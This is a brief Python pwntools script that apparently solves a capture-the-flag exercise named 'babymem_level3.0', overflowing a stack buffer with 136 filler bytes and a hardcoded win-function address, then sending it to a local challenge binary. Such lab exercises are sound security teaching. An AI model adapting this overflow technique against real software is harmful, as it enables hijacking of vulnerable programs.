import pwn

# Prepare the payload
payload = b"A" * 136  # Fill the buffer to reach the return address
payload += pwn.p64(0x402146)  # Append the win function address

# Use the pwntools process module to interact with the challenge binary
with pwn.process("/challenge/babymem_level3.0") as p:
    p.write(str(len(payload)) + "\n")  # Send the length of our payload
    p.write(payload)  # Send the payload itself
    print(p.readallS())  # Print any response we get from the binary

